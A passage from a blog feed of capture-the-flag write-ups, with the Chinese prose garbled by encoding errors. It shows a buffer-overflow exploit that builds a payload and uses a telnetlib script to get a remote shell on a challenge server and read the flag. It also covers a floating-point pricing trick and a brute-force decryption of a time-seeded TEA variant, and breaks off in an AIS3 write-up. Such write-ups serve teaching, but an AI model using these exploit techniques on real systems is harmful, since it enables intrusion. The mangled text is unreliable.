äº†ï¼Œå¦‚æœé€™ä¸€æ­¥åšä¸åˆ°ä¹Ÿæ²’é—œä¿‚ï¼Œæˆ‘å€‘å¯ä»¥é€²è¡Œéœæ…‹åˆ†æï¼š $ python -c &quot;print(&#x27;a&#x27;*0x2000)&quot; | nc hw00.zoolab.org 65534What is your name : % å…ˆ file ä»–ï¼Œå¯ä»¥çŸ¥é“æ˜¯ ELF 64ä½å…ƒçš„åŸ·è¡Œæª”ï¼Œè€Œä¸” debug symbol æ²’æœ‰ strip $ file CafeOverflowCafeOverflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a51ce7f3649d54780b84a937f14af5b4e8a50f51, for GNU/Linux 3.2.0, not stripped é›–ç„¶å¯ä»¥ç”¨è«¸å¦‚ IDAã€Ghidra ä¹‹é¡çš„ decompilerï¼Œä½†é€™è£¡é‚„æ˜¯ç”¨æ¯”è¼ƒç°¡å–®çš„ disassembler ä¾†åšé¡Œç›®å°±å¥½äº† # -s ç”¨ä¾†æŠŠé™¤äº† assembly ä¹‹é¡çš„è¨Šæ¯ä¹Ÿå°å‡ºä¾†ï¼Œæ¯”è¼ƒå¥½æ‰¾åˆ°ä¸€äº›å¸¸æ•¸# -M ç”¨ä¾†æŒ‡å®š objdump é¡¯ç¤º intel syntax é¢¨æ ¼çš„ assembly$ objdump -d -s CafeOverflow -M intel | less main è£¡é¢ç”¨ä¾†åƒè¼¸å…¥çš„åœ°æ–¹ä½¿ç”¨çš„æ˜¯ scanfï¼Œscanf çš„ç¬¬ä¸€å€‹åƒæ•¸æœƒæ”¾åœ¨ rdi ä¸Šï¼Œå› ç‚ºæˆ‘å€‘æœ‰ä¸‹ -sï¼Œå¾€ä¸Šæ»‘åˆ°æœ€ä¸Šé¢å°±å¯ä»¥æ‰¾åˆ° 0x40203dï¼Œå°æ‡‰å­—ä¸² %sï¼Œå› ç‚º %s æ²’æœ‰é™åˆ¶è¼¸å…¥å¤§å°ï¼Œæ‰€ä»¥é€™è£¡æœ‰ä¸€å€‹ buffer overflow çš„æ¼æ´ 401239: 48 8d 45 f0 lea rax,[rbp-0x10]40123d: 48 89 c6 mov rsi,rax401240: 48 8d 3d f6 0d 00 00 lea rdi,[rip+0xdf6] # 40203d &lt;_IO_stdin_used+0x3d&gt;401247: b8 00 00 00 00 mov eax,0x040124c: e8 1f fe ff ff call 401070 &lt;__isoc99_scanf@plt&gt; é¡Œç›®å¾ˆå¥½å¿ƒçš„æœ‰æä¾›é–‹ shell çš„ functionï¼Œå«åš func1ï¼Œå°±åœ¨ main çš„ä¸Šé¢ï¼š 0000000000401176 &lt;func1&gt;: 401176: 55 push rbp 401177: 48 89 e5 mov rbp,rsp 40117a: 48 83 ec 10 sub rsp,0x10 40117e: 48 89 c0 mov rax,rax 401181: 48 89 45 f8 mov QWORD PTR [rbp-0x8],rax 401185: 48 b8 fe ca fe ca fe movabs rax,0xcafecafecafecafe 40118c: ca fe ca 40118f: 48 39 45 f8 cmp QWORD PTR [rbp-0x8],rax 401193: 75 22 jne 4011b7 &lt;func1+0x41&gt; 401195: 48 8d 3d 68 0e 00 00 lea rdi,[rip+0xe68] # 402004 &lt;_IO_stdin_used+0x4&gt; 40119c: e8 8f fe ff ff call 401030 &lt;puts@plt&gt; 4011a1: 48 8d 3d 68 0e 00 00 lea rdi,[rip+0xe68] # 402010 &lt;_IO_stdin_used+0x10&gt; 4011a8: e8 93 fe ff ff call 401040 &lt;system@plt&gt; 4011ad: bf 00 00 00 00 mov edi,0x0 4011b2: e8 c9 fe ff ff call 401080 &lt;exit@plt&gt; 4011b7: 48 8d 3d 5a 0e 00 00 lea rdi,[rip+0xe5a] # 402018 &lt;_IO_stdin_used+0x18&gt; 4011be: e8 6d fe ff ff call 401030 &lt;puts@plt&gt; 4011c3: 90 nop 4011c4: c9 leave 4011c5: c3 ret Exploité‚£æˆ‘å€‘è©¦è©¦çœ‹ç›´æ¥è·³ä¸Šå»æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼š #é¦–å…ˆè£½é€ ä¸€å€‹æª”æ¡ˆåŒ…å« 300 å€‹ 0x401176 (func1 çš„ä½ç½®)#ç”¨ä¾†ç•¶ä½œè¼¸å…¥$ python3 -c &quot;import struct; f=open(&#x27;payload&#x27;,&#x27;wb&#x27;); f.write(struct.pack(&#x27;&lt;Q&#x27;,0x401176)*300) ;f.write(b&#x27;\\n&#x27;); f.close()&quot;#æŠŠè¼¸å…¥ pipe çµ¦ CafeOverflow$ cat payload | ./CafeOverflowWhat is your name : Hello, v@Not quite rightNot quite rightNot quite rightNot quite rightNot quite rightNot quite rightNot quite rightNot quite right...ç•¥ çœ‹ä¾†é‚„æœ‰æ¢ä»¶æ²’é”æˆï¼Œå›é ­çœ‹ä¸€ä¸‹ func1 æœƒç™¼ç¾å…¶å¯¦ä»–æœ‰æª¢æŸ¥ rax æ˜¯å¦ç­‰æ–¼ 0xcafecafecafecafeï¼Œç•¶ç„¶ï¼Œrax æ˜¯å¯æ§çš„ï¼Œä½†é€™é‚Šæä¾›ä¸€å€‹å¿«ä¸€é»çš„è§£æ³•ï¼Œå°±æ˜¯ç›´æ¥è·³åˆ° rax çš„æª¢æŸ¥ä¹‹å¾Œå°±å¥½äº†ï¼Œåœ¨é€™è£¡å°±æ˜¯ 0x4011a1 é€™å€‹ä½ç½® 0000000000401176 &lt;func1&gt;: 401176: 55 push rbp 401177: 48 89 e5 mov rbp,rsp 40117a: 48 83 ec 10 sub rsp,0x10 40117e: 48 89 c0 mov rax,rax 401181: 48 89 45 f8 mov QWORD PTR [rbp-0x8],rax 401185: 48 b8 fe ca fe ca fe movabs rax,0xcafecafecafecafe 40118c: ca fe ca 40118f: 48 39 45 f8 cmp QWORD PTR [rbp-0x8],rax 401193: 75 22 jne 4011b7 &lt;func1+0x41&gt; 401195: 48 8d 3d 68 0e 00 00 lea rdi,[rip+0xe68] # 402004 &lt;_IO_stdin_used+0x4&gt; 40119c: e8 8f fe ff ff call 401030 &lt;puts@plt&gt; 4011a1: 48 8d 3d 68 0e 00 00 lea rdi,[rip+0xe68] # 402010 &lt;_IO_stdin_used+0x10&gt; 4011a8: e8 93 fe ff ff call 401040 &lt;system@plt&gt; 4011ad: bf 00 00 00 00 mov edi,0x0 4011b2: e8 c9 fe ff ff call 401080 &lt;exit@plt&gt; 4011b7: 48 8d 3d 5a 0e 00 00 lea rdi,[rip+0xe5a] # 402018 &lt;_IO_stdin_used+0x18&gt; 4011be: e8 6d fe ff ff call 401030 &lt;puts@plt&gt; 4011c3: 90 nop 4011c4: c9 leave 4011c5: c3 ret æ‰€ä»¥å†è©¦ä¸€æ¬¡ #ä¸€æ¨£é€ ä¸€å€‹æª”æ¡ˆåšè¼¸å…¥$ python3 -c &quot;import struct; f=open(&#x27;payload&#x27;,&#x27;wb&#x27;); f.write(struct.pack(&#x27;&lt;Q&#x27;,0x4011a1)*300) ;f.write(b&#x27;\\n&#x27;); f.close()&quot;# é€™è£¡ç”¨ - æŠŠ stdin æ¥å›ä¾†ï¼Œå¦‚æœæˆåŠŸæ‹¿åˆ° shell æ‰èƒ½å¤ äº’å‹•$ cat payload - | ./CafeOverflowWhat is your name : Hello, ï¿½@whoami #terminal æœƒå¡åœ¨é€™è£¡ï¼Œè¦è‡ªå·±æ‰“ whoamiterrynini38514 çœ‹ä¾† local æˆåŠŸæ‹¿åˆ° shell äº†ï¼Œä¾†è©¦è©¦çœ‹æ‹¿ remote shellï¼Œå› ç‚ºæ˜¯ remote çš„é—œä¿‚ï¼Œç‚ºæ±‚ç©©å®šï¼Œé€™è£¡å°±ä¸ç¹¼çºŒç”¨ cat äº†ï¼Œæ”¹ç”¨ telnetlib ä¾†è·Ÿé ç«¯ socket æºé€š payload.py 123456789101112131415#!/usr/bin/env python3import telnetlibimport structr = telnetlib.Telnet(&quot;hw00.zoolab.org&quot;, 65534)print(r.read_until(b&#x27;What is your name : &#x27;))payload = struct.pack(&#x27;&lt;Q&#x27;,0x4011a1)*300 + b&#x27;\\n&#x27;r.write(payload)print(r.read_until(b&#x27;\\n&#x27;))r.interact() ç„¶å¾Œæˆ‘å€‘å°± pwn ä¸‹ server äº† $ python3 payload.pyb&#x27;What is your name : &#x27;b&#x27;Hello, \\xa1@\\n&#x27;whoamiCafeoverflowcat /home/`whoami`/flagflag&#123;c0ffee_0verfl0win6_from_k3ttle_QAQ&#125; flag: flag&#123;c0ffee_0verfl0win6_from_k3ttle_QAQ&#125; The Floating AquamarineReconé€™é¡Œçš„è€ƒé»æ‡‰è©²å¾ˆæ˜é¡¯æ˜¯æµ®é»æ•¸èª¤å·®ï¼ŒåŸå› æ‡‰è©²å¾ˆå¥½ç†è§£ï¼Œæ‹¿å‡ºé€™å€‹å‰›å­¸ C çš„æ™‚å€™ç·´ç¿’éçš„ç¨‹å¼ï¼Œi ä¸€ç›´åŠ  0.1 æ˜¯ä¸æœƒå‰›å¥½ç­‰æ–¼ 1.0 çš„ï¼Œå› ç‚º IEEE754 çš„ 0.1 ä¸æ˜¯ 0.1ï¼š WTF.c 123456789101112#include &lt;stdio.h&gt;int main()&#123; for(float i = 0 ; i != 1.0 ; i += 0.1)&#123; puts(&quot;not yet&quot;); if ( i &gt; 1.0)&#123; puts(&quot;What the...&quot;); break; &#125; &#125; return 0;&#125; Exploitæ‰€ä»¥åªè¦èƒ½å¤ åœ¨è²·è³£ä¹‹é–“é€ æˆåƒ¹å·®å°±å¥½äº†ï¼Œå•é¡Œæ˜¯æ€éº¼æ‰¾åˆ°ï¼Œå› ç‚ºæˆ‘ä¹Ÿæƒ³ä¸åˆ°ä¸€å€‹å¾ˆè®šçš„æ–¹æ³•ï¼Œä¾‹å¦‚èªªä»€éº¼æŒ‘é€™å…©å€‹æ•¸å­—æ˜¯è³ªæ•¸å•Šï¼Œé‚„æ˜¯æŒ‘çš„æ•¸å­— factor ä¸è¦æœ‰ 5,2 å•Šä»€éº¼çš„ï¼Œæˆ‘æ˜¯æ²’æƒ³å‡ºä¾†ï¼Œæœ‰ä»€éº¼å¾ˆé…·ç‚«çš„æ•¸å­¸æ–¹æ³•å†å‘Šè¨´æˆ‘ï¼Œé€™é¡Œè¼ƒå¿«çš„æ–¹æ³•å°±çˆ†ç ´æˆ–æ˜¯é æ„Ÿè¦ºï¼ˆï¼Ÿï¼‰ï¼Œ ç¸½ä¹‹æˆ‘æ˜¯é æ„Ÿè¦ºæŠŠ 100000000 æ‹†æˆå…©å€‹è³ªæ•¸å°±éäº†ï¼Œä»¤äººé›£ä»¥æ¥å—ï¼Œç•¶ç„¶é€™è£¡å¯ä»¥è¼•é¬†å¯«å€‹ C ä¾†å¹«åŠ©ä½ ï¼Œæ—¢ç„¶æµ®é»æ•¸èª¤å·®ç®—èµ·ä¾†éº»ç…©ï¼Œé‚£å°±ä¸è¦ç®—ï¼Œå°±è®“ä»–èª¤å·®å°±å¥½äº†ï¼š Buffett.c 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;cassert&gt;#include &lt;unistd.h&gt;#include &lt;iomanip&gt;#include &lt;algorithm&gt;using std::cin;using std::cout;using std::endl;using std::getenv;using std::max;const int ALL_STONE = 100000000;const float PRICE = 88.88;const float RICH = 3000.0;int main(int argc, char *argv[]) &#123; std::cout &lt;&lt; std::setprecision(16); float max_gain = 0; for(int i = 1; i &lt; ALL_STONE ; i++)&#123; float gain = -PRICE*(ALL_STONE) + PRICE*i + PRICE*(ALL_STONE-i); if (gain &gt; max_gain)&#123; cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; ALL_STONE-i &lt;&lt; &quot; &quot;&lt;&lt; gain &lt;&lt; endl; max_gain = gain; &#125; &#125; return 0;&#125;/*6 99999994 102496646572 3353428 108896654844 3345156 1120*/ æ‰€ä»¥å°±è²·ç²åˆ© 1120 çš„é‚£çµ„å°±å°äº†ï¼Œç„¶å¾Œæˆ‘çš„è²·æ³•ï¼š 1234567891011100000000-99999989-11100000000-99999989-11100000000-99999989-11Wow! You have 3025.68 dollars!Well done! Here is your flag: FLAG&#123;floating_point_error_https://0.30000000000000004.com/&#125; flag: FLAG&#123;floating_point_error_https://0.30000000000000004.com/&#125; è§£å¯†ä¸€ä¸‹Reconé€™é¡Œçš„ä¸­æ–‡çœ‹èµ·ä¾†æœ‰é»ç…©èºï¼Œç¸½ä¹‹æ­£è½‰æ›è·Ÿé€†è½‰æ›åŸºæœ¬ä¸Šå°±åªæ˜¯æŠŠ bytes è·Ÿ list äº’æ›ï¼Œæ²’æœ‰èª¤ç”¨çš„è©±å°åŠ å¯†çš„éç¨‹æ²’æœ‰å±å®³ï¼Œ_åŠ å¯†é€™å€‹ function å¯¦ä½œçš„æ˜¯ Tiny Encryption Algorithmï¼Œå·®åˆ¥æ˜¯å‡ºé¡Œè€…çš„ Delta ç”¨äº†ä¸åŒçš„æ•¸å€¼ï¼Œä¸èƒ½è­˜åˆ¥å‡ºæ˜¯é€™å€‹ç®—æ³•ä¹Ÿæ²’é—œä¿‚ï¼Œä»”ç´°çœ‹çš„è©±ï¼Œå®Œå…¨æ˜¯å¯ä»¥è‡ªå·±å¯«å‡ºè§£å¯†å‡½å¼çš„ï¼Œå¯ä»¥å˜—è©¦é¤µè¼¸å…¥çµ¦_åŠ å¯†çœ‹çœ‹ï¼Œå¾éç¨‹è·Ÿçµæœçœ‹èµ·ä¾†é€™æ‡‰è©²æ˜¯ä¸€å€‹æœ‰ç”¨çš„åŠ å¯† functionï¼ŒåŠ ä¸Šå¯†æ–‡éçŸ­ï¼Œé‡å°åŠ å¯†æ–¹æ³•æœ¬èº«çš„æ”»æ“Šåœ¨é€™è£¡çœ‹èµ·ä¾†ä¸å¤ªå¯èƒ½ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env python3import time as æ™‚é–“import random as éš¨æ©Ÿfrom typing import List as é™£åˆ—from io import BufferedReader as ç·©è¡è®€å–è€…from forbiddenfruit import curse as è©›å’’æ•´æ•¸ = intè©›å’’(æ•´æ•¸, &quot;å¾ä½å…ƒçµ„&quot;, æ•´æ•¸.from_bytes)è©›å’’(æ•´æ•¸, &quot;åˆ°ä½å…ƒçµ„&quot;, æ•´æ•¸.to_bytes)ä½å…ƒçµ„ = bytesè©›å’’(ä½å…ƒçµ„, &quot;åå…­é€²åˆ¶&quot;, ä½å…ƒçµ„.hex)è©›å’’(ä½å…ƒçµ„, &quot;åŠ å…¥&quot;, ä½å…ƒçµ„.join)è©›å’’(ç·©è¡è®€å–è€…, &quot;è®€å–&quot;, ç·©è¡è®€å–è€….read)éš¨æ©Ÿ.ç¨®å­ = éš¨æ©Ÿ.seedéš¨æ©Ÿ.çµ¦æˆ‘éš¨æ©Ÿä½å…ƒå€‘ = éš¨æ©Ÿ.getrandbitsæ™‚é–“.ç¾åœ¨ = æ™‚é–“.timeåˆ—å° = printæ‰“é–‹ = openç¯„åœ = rangeé•·åº¦ = lenå¤§ç«¯åº = &#x27;big&#x27;è®€å–ä½å…ƒçµ„ = &#x27;rb&#x27;def æ­£è½‰æ›(è³‡æ–™, å¤§å°=4): return [æ•´æ•¸.å¾ä½å…ƒçµ„(è³‡æ–™[ç´¢å¼•:ç´¢å¼•+å¤§å°], å¤§ç«¯åº) for ç´¢å¼• in ç¯„åœ(0, é•·åº¦(è³‡æ–™), å¤§å°)]def é€†è½‰æ›(è³‡æ–™, å¤§å°=4): return b&#x27;&#x27;.åŠ å…¥([å…ƒç´ .åˆ°ä½å…ƒçµ„(å¤§å°, å¤§ç«¯åº) for å…ƒç´  in è³‡æ–™])def _åŠ å¯†(å‘é‡: é™£åˆ—[æ•´æ•¸], é‡‘é‘°: é™£åˆ—[æ•´æ•¸]): ç´¯åŠ , å¾—å„ªå¡”, é®ç½© = 0, 0xFACEB00C, 0xffffffff for æ¬¡æ•¸ in ç¯„åœ(32): ç´¯åŠ  = ç´¯åŠ  + å¾—å„ªå¡” &amp; é®ç½© å‘é‡[0] = å‘é‡[0] + ((å‘é‡[1] &lt;&lt; 4) + é‡‘é‘°[0] &amp; é®ç½© ^ (å‘é‡[1] + ç´¯åŠ ) &amp; é®ç½© ^ (å‘é‡[1] &gt;&gt; 5) + é‡‘é‘°[1] &amp; é®ç½©) &amp; é®ç½© å‘é‡[1] = å‘é‡[1] + ((å‘é‡[0] &lt;&lt; 4) + é‡‘é‘°[2] &amp; é®ç½© ^ (å‘é‡[0] + ç´¯åŠ ) &amp; é®ç½© ^ (å‘é‡[0] &gt;&gt; 5) + é‡‘é‘°[3] &amp; é®ç½©) &amp; é®ç½© return å‘é‡def åŠ å¯†(æ˜æ–‡: ä½å…ƒçµ„, å¯†é‘°: ä½å…ƒçµ„): å¯†æ–‡ = b&#x27;&#x27; for ç´¢å¼• in ç¯„åœ(0, é•·åº¦(æ˜æ–‡), 8): å¯†æ–‡ += é€†è½‰æ›(_åŠ å¯†(æ­£è½‰æ›(æ˜æ–‡[ç´¢å¼•:ç´¢å¼•+8]), æ­£è½‰æ›(å¯†é‘°))) return å¯†æ–‡if __name__ == &#x27;__main__&#x27;: æ——å¹Ÿ = æ‰“é–‹(&#x27;æ——å¹Ÿ&#x27;, è®€å–ä½å…ƒçµ„).è®€å–() assert é•·åº¦(æ——å¹Ÿ) == 16 éš¨æ©Ÿ.ç¨®å­(æ•´æ•¸(æ™‚é–“.ç¾åœ¨())) å¯†é‘° = éš¨æ©Ÿ.çµ¦æˆ‘éš¨æ©Ÿä½å…ƒå€‘(128).åˆ°ä½å…ƒçµ„(16, å¤§ç«¯åº) å¯†æ–‡ = åŠ å¯†(æ——å¹Ÿ, å¯†é‘°) åˆ—å°(f&#x27;å¯†æ–‡ = &#123;å¯†æ–‡.åå…­é€²åˆ¶()&#125;&#x27;) Exploitä½†æˆ‘å€‘å¯ä»¥æ³¨æ„åˆ°ï¼Œé€™ç¨‹å¼çš„å¯†é‘°æ˜¯å°‡æ™‚é–“åšç‚º random seed æ‰€éš¨æ©Ÿå‡ºä¾†çš„ 128 bitsï¼Œé‚£æˆ‘å€‘å°±å¯ä»¥æŠŠ key space ç¸®å°åˆ°æˆ‘å€‘å¯ä»¥ brute force å‡ºä¾†çš„å¤§å°ï¼Œè‡³å°‘çŸ¥é“é€™å€‹æ™‚é–“é»æ˜¯åœ¨ python3 è¢«ç™¼è¡Œåˆ°ä½ ç¾åœ¨çš„é€™å€‹ç¬é–“ 4950éš¨æ©Ÿ.ç¨®å­(æ•´æ•¸(æ™‚é–“.ç¾åœ¨()))å¯†é‘° = éš¨æ©Ÿ.çµ¦æˆ‘éš¨æ©Ÿä½å…ƒå€‘(128).åˆ°ä½å…ƒçµ„(16, å¤§ç«¯åº) ä¹Ÿå°±æ˜¯æˆ‘å€‘åªè¦æšèˆ‰å¾ç¾åœ¨é–‹å§‹å¾€å‰çš„æ¯ç§’ä½œç‚º random seed ç›´æ¥è§£å¯†çœ‹çœ‹å°±å¥½äº†ï¼Œå› ç‚ºæ˜¯ä»¥ 8 byte ç‚ºä¸€å€‹å–®ä½è§£å¯†ï¼Œæˆ‘å€‘å…ˆè§£å‰é¢ 8 byte çœ‹æœ‰æ²’æœ‰ flag prefix æœƒå¿«ä¸€é»ã€‚æ³¨æ„çš„æ˜¯å› ç‚ºæˆ‘å€‘åœ¨é€†è½‰åŠ å¯† aka è§£å¯†ï¼Œç´¯åŠ è¦æ›æˆ0xfaceb00c*32&amp;0xffffffffï¼Œæ“ä½œä¹Ÿéƒ½æ˜¯åè½‰ï¼Œæ‰æ›¸è¢‹ä¸€ä¸‹ï¼Œå°± Feistelï¼Œçœ‹è‘—åœ–æ¯”è¼ƒå¥½ç†è§£ç‚ºå•¥è¦é€†è½‰ï¼š decrypt.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python3import time as æ™‚é–“import random as éš¨æ©Ÿfrom typing import List as é™£åˆ—from io import BufferedReader as ç·©è¡è®€å–è€…from forbiddenfruit import curse as è©›å’’æ•´æ•¸ = intè©›å’’(æ•´æ•¸, &quot;å¾ä½å…ƒçµ„&quot;, æ•´æ•¸.from_bytes)è©›å’’(æ•´æ•¸, &quot;åˆ°ä½å…ƒçµ„&quot;, æ•´æ•¸.to_bytes)ä½å…ƒçµ„ = bytesè©›å’’(ä½å…ƒçµ„, &quot;åå…­é€²åˆ¶&quot;, ä½å…ƒçµ„.hex)è©›å’’(ä½å…ƒçµ„, &quot;åŠ å…¥&quot;, ä½å…ƒçµ„.join)è©›å’’(ç·©è¡è®€å–è€…, &quot;è®€å–&quot;, ç·©è¡è®€å–è€….read)éš¨æ©Ÿ.ç¨®å­ = éš¨æ©Ÿ.seedéš¨æ©Ÿ.çµ¦æˆ‘éš¨æ©Ÿä½å…ƒå€‘ = éš¨æ©Ÿ.getrandbitsæ™‚é–“.ç¾åœ¨ = æ™‚é–“.timeåˆ—å° = printæ‰“é–‹ = openç¯„åœ = rangeé•·åº¦ = lenå¤§ç«¯åº = &#x27;big&#x27;è®€å–ä½å…ƒçµ„ = &#x27;rb&#x27;def æ­£è½‰æ›(è³‡æ–™, å¤§å°=4): return [æ•´æ•¸.å¾ä½å…ƒçµ„(è³‡æ–™[ç´¢å¼•:ç´¢å¼•+å¤§å°], å¤§ç«¯åº) for ç´¢å¼• in ç¯„åœ(0, é•·åº¦(è³‡æ–™), å¤§å°)]def é€†è½‰æ›(è³‡æ–™, å¤§å°=4): return b&#x27;&#x27;.åŠ å…¥([å…ƒç´ .åˆ°ä½å…ƒçµ„(å¤§å°, å¤§ç«¯åº) for å…ƒç´  in è³‡æ–™])def _è§£å¯†(å‘é‡: é™£åˆ—[æ•´æ•¸], é‡‘é‘°: é™£åˆ—[æ•´æ•¸]): ç´¯åŠ , å¾—å„ªå¡”, é®ç½© = 0x59d60180, 0xFACEB00C, 0xffffffff for æ¬¡æ•¸ in ç¯„åœ(32): å‘é‡[1] = å‘é‡[1] - ((å‘é‡[0] &lt;&lt; 4) + é‡‘é‘°[2] &amp; é®ç½© ^ (å‘é‡[0] + ç´¯åŠ ) &amp; é®ç½© ^ (å‘é‡[0] &gt;&gt; 5) + é‡‘é‘°[3] &amp; é®ç½©) &amp; é®ç½© å‘é‡[0] = å‘é‡[0] - ((å‘é‡[1] &lt;&lt; 4) + é‡‘é‘°[0] &amp; é®ç½© ^ (å‘é‡[1] + ç´¯åŠ ) &amp; é®ç½© ^ (å‘é‡[1] &gt;&gt; 5) + é‡‘é‘°[1] &amp; é®ç½©) &amp; é®ç½© ç´¯åŠ  = ç´¯åŠ  - å¾—å„ªå¡” &amp; é®ç½© return å‘é‡def è§£å¯†(æ˜æ–‡: ä½å…ƒçµ„, å¯†é‘°: ä½å…ƒçµ„): å¯†æ–‡ = b&#x27;&#x27; for ç´¢å¼• in ç¯„åœ(0, é•·åº¦(æ˜æ–‡), 8): å¯†æ–‡ += é€†è½‰æ›(_è§£å¯†(æ­£è½‰æ›(æ˜æ–‡[ç´¢å¼•:ç´¢å¼•+8]), æ­£è½‰æ›(å¯†é‘°))) return å¯†æ–‡from itertools import productif __name__ == &#x27;__main__&#x27;: cipher = bytes.fromhex(&#x27;77f905c39e36b5eb0deecbb4eb08e8cb&#x27;) now = int(æ™‚é–“.time()) - 86400*2 subcipher = cipher[:8] while now &gt; 0: now -= 1 éš¨æ©Ÿ.ç¨®å­(now) å¯†é‘° = éš¨æ©Ÿ.çµ¦æˆ‘éš¨æ©Ÿä½å…ƒå€‘(128).åˆ°ä½å…ƒçµ„(16, å¤§ç«¯åº) plain = è§£å¯†(subcipher, å¯†é‘°) if plain.startswith((b&#x27;flag&#x27;,b&#x27;FLAG&#x27;)): print(è§£å¯†(cipher, å¯†é‘°)) break ç„¶å¾Œå°±å¯ä»¥æ‹¿åˆ° flag äº† flag: FLAG&#123;4lq7mWGh93&#125;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"},{"name":"Cryptography","slug":"Cryptography","permalink":"http://blog.terrynini.tw/tags/Cryptography/"},{"name":"Pwn","slug":"Pwn","permalink":"http://blog.terrynini.tw/tags/Pwn/"},{"name":"Misc","slug":"Misc","permalink":"http://blog.terrynini.tw/tags/Misc/"}]},{"title":"2020::AIS3::å‰æ¸¬å®˜æ–¹è§£","slug":"2020-AIS3-å‰æ¸¬å®˜æ–¹è§£","date":"2020-06-29T05:37:00.000Z","updated":"2024-06-20T16:46:01.852Z","comments":true,"path":"tw/2020-AIS3-å‰æ¸¬å®˜æ–¹è§£/","permalink":"http://blog.terrynini.tw/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/","excerpt":"ä»Šå¹´çš„ AIS3 å‰æ¸¬åˆè¼ªåˆ°æˆ‘å‡ºé€†å‘æ¯’å®³å¤§å®¶ï¼Œé€™æ¬¡æ¯å€‹é¡Œç¨®å…¶å¯¦éƒ½æœ‰ä¸€é¡Œè€ƒå¤é¡Œï¼Œæ•´é«”é›£åº¦ä¹Ÿæœ‰ä¸‹ä¿®ï¼Œæ„æ€å°±æ˜¯è§£æ³•å¾ˆå¤šç¨®ï¼Œæ²’æœ‰å…¨éƒ¨æ“‹èµ·ä¾†ï¼Œæ˜¯å€‹ä¸»è¾¦é‚£é‚Šå¸Œæœ›å¤§å®¶éƒ½èƒ½å­¸åˆ°æ±è¥¿çš„æ¦‚å¿µï¼Œæ‰€ä»¥é€™ç¯‡ writeup çš„å­—æ•¸å¯èƒ½ä¹Ÿæœƒå¾ˆå¤šï¼Œå¸Œæœ›æ²’è§£é–‹çš„ã€æˆ–æ˜¯å®Œå…¨ä¸çŸ¥é“è¦å¹¹å˜›çš„äººéƒ½èƒ½çœ‹æ‡‚ã€‚ ç„¶å¾Œ source code åœ¨é€™è£¡ github ç¸½ä¹‹é€™è£¡æ˜¯æˆ‘é è¨­çš„è§£æ³•, gogoï¼š","text":"ä»Šå¹´çš„ AIS3 å‰æ¸¬åˆè¼ªåˆ°æˆ‘å‡ºé€†å‘æ¯’å®³å¤§å®¶ï¼Œé€™æ¬¡æ¯å€‹é¡Œç¨®å…¶å¯¦éƒ½æœ‰ä¸€é¡Œè€ƒå¤é¡Œï¼Œæ•´é«”é›£åº¦ä¹Ÿæœ‰ä¸‹ä¿®ï¼Œæ„æ€å°±æ˜¯è§£æ³•å¾ˆå¤šç¨®ï¼Œæ²’æœ‰å…¨éƒ¨æ“‹èµ·ä¾†ï¼Œæ˜¯å€‹ä¸»è¾¦é‚£é‚Šå¸Œæœ›å¤§å®¶éƒ½èƒ½å­¸åˆ°æ±è¥¿çš„æ¦‚å¿µï¼Œæ‰€ä»¥é€™ç¯‡ writeup çš„å­—æ•¸å¯èƒ½ä¹Ÿæœƒå¾ˆå¤šï¼Œå¸Œæœ›æ²’è§£é–‹çš„ã€æˆ–æ˜¯å®Œå…¨ä¸çŸ¥é“è¦å¹¹å˜›çš„äººéƒ½èƒ½çœ‹æ‡‚ã€‚ ç„¶å¾Œ source code åœ¨é€™è£¡ github ç¸½ä¹‹é€™è£¡æ˜¯æˆ‘é è¨­çš„è§£æ³•, gogoï¼š ğŸ TsaiBro (è€ƒå¤é¡Œ)é¡Œç›®æ•˜è¿° å¾ˆå¥½â€¦.ä½ å¾ˆè…¦æ®˜å—â€¦.æ•¢é€™æ¨£è¬›åˆ€åŠç¥åŸŸâ€¦â€¦.æˆ‘æ­»ä¹Ÿä¸æœƒæ”¾éä½  æˆ‘..è¦..æ®ºæ­»â€¦ä½ .. é¡Œè§£é€™é¡Œä¹‹å‰åœ¨ BambooFox é‚€è¬›çš„ç¤¾èª²ä¸Šä¹Ÿæœ‰æåˆ°éï¼Œæ˜¯å€‹å¯ä»¥ä¸ç”¨é€†å‘ä¹Ÿèƒ½å¤ è§£é–‹çš„é¡Œç›®ï¼Œè·Ÿå»å¹´å‰æ¸¬æ˜¯åŒä¸€é¡Œï¼Œé€£åå­—ä¹Ÿæ²’æ› èª’å˜¿(å‚³é€é–€)ï¼Œå·®åˆ¥åªæœ‰ä½¿ç”¨çš„ table ä¸åŒï¼Œé¡Œç›®å¯¦ä½œäº†è‡ªå·±çš„ Tap codeï¼Œé€é 8*8 çš„ table ä¾† encode è¼¸å…¥ï¼š $1$ $2$ $3$ $4$ $5$ $6$ $7$ $8$ $1$ 5 6 7 8 9 { } _ $2$ W X Y 0 y z A B $3$ a b c d m n o p $4$ S T U V G H I J $5$ K L M N u v w x $6$ e f g h q r s t $7$ i j k l O P Q R $8$ C D E F 1 2 3 4 èˆ‰ä¾‹ï¼Œï¼· é€™å€‹å­—æœƒè¢«è½‰æ›æˆ . ..ï¼Œä»¥æ­¤é¡æ¨ã€‚é€™å€‹ table å¯ä»¥é€éé»‘ç®±æ¸¬è©¦æ¨ç†ã€stringsã€æˆ–æ˜¯é€†å‘æ‰¾åˆ°ï¼Œé€™è£¡ç”¨ radare2 çœ‹ä¸€ä¸‹å¯ä»¥æ‰¾åˆ° table åœ¨ 0x201020ï¼š å¯«å€‹ script æŠŠ TsaiBroSaid è§£å›ä¾†å°±å¥½äº†ã€‚ solve.py#!/usr/bin/env python3table = 